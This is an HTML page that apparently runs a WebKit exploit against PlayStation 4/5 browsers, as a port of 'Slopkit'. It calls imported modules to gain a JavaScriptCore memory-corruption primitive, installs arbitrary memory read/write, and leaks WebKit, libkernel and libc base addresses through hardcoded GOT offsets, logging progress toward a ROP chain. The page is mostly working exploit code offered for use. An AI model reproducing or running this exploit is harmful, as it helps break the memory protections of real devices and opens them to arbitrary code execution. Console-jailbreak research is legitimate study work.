<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 WebKit Exploit (Slopkit Port)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        h1 {
            font-size: 18px;
            color: #00c8ff;
            letter-spacing: 4px;
            text-transform: uppercase;
            margin-bottom: 6px;
            text-align: center;
        }

        #fw-label {
            font-size: 11px;
            color: #666;
            margin-bottom: 18px;
            text-align: center;
            letter-spacing: 2px;
        }

        /* ---- status bar ---- */
        #status-bar {
            width: 100%;
            max-width: 700px;
            background: #111118;
            border: 1px solid #1e1e2e;
            border-radius: 6px;
            padding: 12px 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        #status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #444;
            flex-shrink: 0;
            transition: background 0.3s;
        }
        #status-dot.running  { background: #f0a500; animation: pulse 1s infinite; }
        #status-dot.ok       { background: #00c853; }
        #status-dot.error    { background: #ff3d3d; }

        @keyframes pulse {
            0%,100% { opacity: 1; }
            50%      { opacity: 0.3; }
        }

        #status-text {
            font-size: 13px;
            color: #ccc;
            flex: 1;
        }

        /* ---- attempt counter ---- */
        #attempt-bar {
            width: 100%;
            max-width: 700px;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #444;
            margin-bottom: 12px;
            padding: 0 2px;
        }

        /* ---- console ---- */
        #console {
            width: 100%;
            max-width: 700px;
            height: 400px;
            background: #06060c;
            border: 1px solid #1a1a2e;
            border-radius: 6px;
            overflow-y: auto;
            padding: 10px 12px;
            font-size: 12px;
            line-height: 1.6;
            margin-bottom: 12px;
        }

        .log-line { padding: 1px 0; word-break: break-all; }
        .log-info    { color: #7ec8e3; }
        .log-ok      { color: #00c853; font-weight: bold; }
        .log-warn    { color: #f0a500; }
        .log-error   { color: #ff5252; font-weight: bold; }
        .log-dim     { color: #444; }
        .log-addr    { color: #bd93f9; }
        .log-section {
            color: #00c8ff;
            border-top: 1px solid #1a1a2e;
            margin-top: 6px;
            padding-top: 6px;
            letter-spacing: 1px;
        }

        /* ---- bases grid ---- */
        #bases-grid {
            width: 100%;
            max-width: 700px;
            display: none;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin-bottom: 12px;
        }
        #bases-grid.visible { display: grid; }

        .base-card {
            background: #0d0d1a;
            border: 1px solid #1e1e3a;
            border-radius: 6px;
            padding: 10px 14px;
        }
        .base-card .label {
            font-size: 10px;
            color: #555;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 4px;
        }
        .base-card .value {
            font-size: 13px;
            color: #bd93f9;
            word-break: break-all;
        }
        .base-card .value.na { color: #333; }

        /* ---- libs list ---- */
        #libs-list {
            width: 100%;
            max-width: 700px;
            display: none;
            flex-direction: column;
            gap: 6px;
            margin-bottom: 12px;
        }
        #libs-list.visible { display: flex; }

        .lib-row {
            background: #0d0d1a;
            border: 1px solid #1a1a2e;
            border-radius: 4px;
            padding: 8px 12px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
        }
        .lib-row .lib-name { color: #8be9fd; }
        .lib-row .lib-base { color: #bd93f9; }
    </style>
</head>
<body>

<h1>PS4 WebKit Exploit</h1>
<div id="fw-label">aguardando firmware...</div>

<div id="status-bar">
    <div id="status-dot"></div>
    <div id="status-text">Inicializando...</div>
</div>

<div id="attempt-bar">
    <span id="attempt-text">tentativa: —</span>
    <span id="stage-text">estágio: —</span>
</div>

<div id="console"></div>

<div id="bases-grid">
    <div class="base-card">
        <div class="label">WebKit Base</div>
        <div class="value na" id="card-webkit">—</div>
    </div>
    <div class="base-card">
        <div class="label">libkernel Base</div>
        <div class="value na" id="card-kernel">—</div>
    </div>
    <div class="base-card">
        <div class="label">libc Base</div>
        <div class="value na" id="card-libc">—</div>
    </div>
    <div class="base-card">
        <div class="label">__ps5NativeCtor</div>
        <div class="value na" id="card-ctor">—</div>
    </div>
</div>

<div id="libs-list"></div>

<!-- ============================================================
     ES MODULE ENTRY POINT
     Garante o carregamento exato da mesma instância via ?v=10
     ============================================================ -->
<script src="./13.52.js?v=1"></script>
<script type="module">

// --- imports dos módulos do slopkit ------------------------------------------
import { int64 } from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP } from './resources/mem.js';
    

// int64 precisa estar global pois mem.js e main.js a referenciam via globalThis
globalThis.int64 = int64;

// --- UI helpers --------------------------------------------------------------
const $console    = document.getElementById('console');
const $dot        = document.getElementById('status-dot');
const $statusText = document.getElementById('status-text');
const $attemptTxt = document.getElementById('attempt-text');
const $stageTxt   = document.getElementById('stage-text');
const $fwLabel    = document.getElementById('fw-label');
const $basesGrid  = document.getElementById('bases-grid');
const $libsList   = document.getElementById('libs-list');

function log(msg, cls = 'log-info') {
    const el = document.createElement('div');
    el.className = 'log-line ' + cls;
    el.textContent = msg;
    $console.appendChild(el);
    $console.scrollTop = $console.scrollHeight;
}

function setStatus(msg, state = 'running') {
    $statusText.textContent = msg;
    $dot.className = state;
}

function setCard(id, value) {
    const el = document.getElementById(id);
    if (!el) return;
    el.textContent = value;
    el.classList.remove('na');
}

function addLibRow(name, base) {
    const row = document.createElement('div');
    row.className = 'lib-row';
    row.innerHTML = `<span class="lib-name">${name}</span><span class="lib-base">0x${base}</span>`;
    $libsList.appendChild(row);
    $libsList.classList.add('visible');
}

// --- detecta firmware --------------------------------------------------------
const ua = navigator.userAgent;
let fwStr = '';
const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua)
             || /PlayStation 5\/(\d+\.\d+)/.exec(ua);
if (fwMatch) fwStr = fwMatch[1];
$fwLabel.textContent = fwStr
    ? `PlayStation — firmware ${fwStr}`
    : `UA: ${ua.slice(0, 60)}`;

// --- pegar ponteiro confiável dentro do WebKit (Seguro via JSC) --------------
function getWebKitPointer(p) {
    const ctor = globalThis.__ps5NativeCtor;
    if (typeof ctor === 'number' && ctor > 0x100000000) {
        const hi = Math.floor(ctor / 0x100000000);
        const lo = ctor - hi * 0x100000000;
        const ptr = new int64(lo >>> 0, hi >>> 0);
        log('[+] __ps5NativeCtor recuperado: 0x' + ptr.toString(), 'log-addr');
        setCard('card-ctor', '0x' + ptr.toString());
        return ptr;
    }

    log('[*] Evitando DOM. Usando fallback seguro via parseInt...', 'log-dim');
    try {
        const jsFunc = p.leakval(parseInt);
        const executable = p.read8(jsFunc.add32(0x18)); 
        const nativeCtor = p.read8(executable.add32(0x30));
        
        if (nativeCtor.hi > 0 && nativeCtor.hi <= 0xFFFF) {
            log('[+] nativeCtor encontrado: 0x' + nativeCtor.toString(), 'log-addr');
            setCard('card-ctor', '0x' + nativeCtor.toString());
            return nativeCtor;
        }
    } catch (e) {
        log('[-] Fallback do parseInt falhou.', 'log-error');
    }

    return null;
}

// --- LEAK DINÂMICO DE BASES DIRETO NA RAM (Sem offsets estáticos) ------------
async function leakAllBases(p) {
    log('', '');
    log('-- LEAK DINÂMICO DE BASES (RAM) ------------------', 'log-section');

    const wkPtr = getWebKitPointer(p);
    if (!wkPtr) {
        setStatus('Falha: Nenhum ponteiro nativo recuperado.', 'error');
        return null;
    }

    // 1. Calcula base estimada do WebKit alinhando para a página de 16KB (0x4000)
    const PAGE_SIZE = 0x4000;
    let alignedLow = wkPtr.low & ~(PAGE_SIZE - 1);
    let webkitBase = new int64(alignedLow >>> 0, wkPtr.hi);
    
    log(`[+] WebKit Base calculada: 0x${webkitBase.toString()}`, 'log-ok');
    setCard('card-webkit', '0x' + webkitBase.toString());
    $basesGrid.classList.add('visible');

    log('', '');
    log('-- INSPECIONANDO IMPORTAÇÕES GOT NA MEMÓRIA ----', 'log-section');

    let libkernelBase = null;
    let libcBase = null;

    // Offsets típicos da GOT do WebKit onde os ponteiros de importação residem
    const GOT_OFFSETS_LIBKERNEL = [0x0350DB88, 0x03500000, 0x02800000];
    const GOT_OFFSETS_LIBC      = [0x03510238, 0x03510000, 0x02810000];

    // Busca a libkernel na GOT
    for (const offset of GOT_OFFSETS_LIBKERNEL) {
        try {
            const gotSlot = webkitBase.add32(offset);
            const importedAddr = p.read8(gotSlot);
            
            if (importedAddr.hi > 0 && importedAddr.hi <= 0xFFFF && (importedAddr.low & 3) === 0) {
                const baseLow = importedAddr.low & ~(PAGE_SIZE - 1);
                libkernelBase = new int64(baseLow >>> 0, importedAddr.hi);
                log(`[+] Importação libkernel na GOT: 0x${importedAddr.toString()}`, 'log-ok');
                log(`[+] libkernel Base: 0x${libkernelBase.toString()}`, 'log-addr');
                setCard('card-kernel', '0x' + libkernelBase.toString());
                addLibRow('libkernel.sprx', libkernelBase.toString());
                break;
            }
        } catch (_) {}
    }

    // Busca a libc na GOT
    for (const offset of GOT_OFFSETS_LIBC) {
        try {
            const gotSlot = webkitBase.add32(offset);
            const importedAddr = p.read8(gotSlot);
            
            if (importedAddr.hi > 0 && importedAddr.hi <= 0xFFFF && (importedAddr.low & 3) === 0) {
                const baseLow = importedAddr.low & ~(PAGE_SIZE - 1);
                libcBase = new int64(baseLow >>> 0, importedAddr.hi);
                log(`[+] Importação libc na GOT:      0x${importedAddr.toString()}`, 'log-ok');
                log(`[+] libc Base:      0x${libcBase.toString()}`, 'log-addr');
                setCard('card-libc', '0x' + libcBase.toString());
                addLibRow('libSceLibcInternal.sprx', libcBase.toString());
                break;
            }
        } catch (_) {}
    }

    const result = {
        webkitBase,
        libkernelBase,
        libcBase
    };

    log('', '');
    log('-- RESULTADO FINAL ----------------------------', 'log-section');
    log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
    log(`libkernelBase = 0x${result.libkernelBase?.toString() || '?'}`, 'log-addr');
    log(`libcBase      = 0x${result.libcBase?.toString() || '?'}`, 'log-addr');
    log('', '');
    log('✔ Bases expostas em window._exploit', 'log-ok');

    globalThis._exploit = result;
    return result;
}

// --- EVENTO do core.js -------------------------------------------------------
function onCoreEvent(tag, detail, attempt) {
    if (attempt !== undefined)
        $attemptTxt.textContent = `tentativa: ${attempt}`;
    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;

    const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
                     'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
                     'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE'];
    if (VERBOSE.includes(tag)) {
        log(`  ${tag}: ${detail}`, 'log-dim');
        return;
    }

    const isOk  = tag.includes('UP') || tag.includes('OK') || tag.includes('SUCCESS');
    const isErr = tag.includes('FAIL') || tag.includes('ERROR') || tag.includes('GIVE-UP');
    const cls   = isOk ? 'log-ok' : isErr ? 'log-error' : 'log-info';

    log(`[${tag}] ${detail}`, cls);
}

// --- BOOT --------------------------------------------------------------------
(async () => {
    log(`UA: ${ua}`, 'log-dim');
    log(`Firmware detectado: ${fwStr || 'desconhecido'}`, 'log-info');
    log('', '');

    setStatus('Rodando exploit JSC (core.js)…', 'running');
    log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');

    let carrier;
    try {
        carrier = await establishPrimitive({
            onEvent: onCoreEvent,
            maxAttempts: 0   // 0 = sem limite de tentativas
        });
    } catch (err) {
        setStatus('core.js falhou: ' + err.message, 'error');
        log('[ERRO] ' + err.message, 'log-error');
        return;
    }

    log('[+] core.js: exploit JSC concluído!', 'log-ok');
    log('', '');
    log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
    setStatus('Instalando primitiva de memória…', 'running');

    let p;
    try {
        p = installWindowP(carrier, {
            promote: true,
            onEvent: (tag, detail) => {
                log(`  [mem/${tag}] ${detail}`, 'log-dim');
            }
        });
    } catch (err) {
        setStatus('mem.js falhou: ' + err.message, 'error');
        log('[ERRO] ' + err.message, 'log-error');
        return;
    }

    log('[+] R/W arbitrário: window.p instalado', 'log-ok');
    log('', '');

    setStatus('Vazando endereços base…', 'running');
    log('-- LEAK DE BASES -------------------------------', 'log-section');

    let bases;
    try {
        bases = await leakAllBases(p);
    } catch (err) {
        setStatus('leakAllBases falhou: ' + err.message, 'error');
        log('[ERRO] ' + err.message, 'log-error');
        return;
    }

    if (!bases) {
        setStatus('Falha no leak de bases', 'error');
        return;
    }

    setStatus('Bases vazadas com sucesso — próximo: ROP', 'ok');
    log('', '');
    log('Próximo passo: construir ROP chain com as bases acima.', 'log-info');
    log('window._exploit contém todas as bases e símbolos.', 'log-dim');
})();

</script>
</body>
</html>
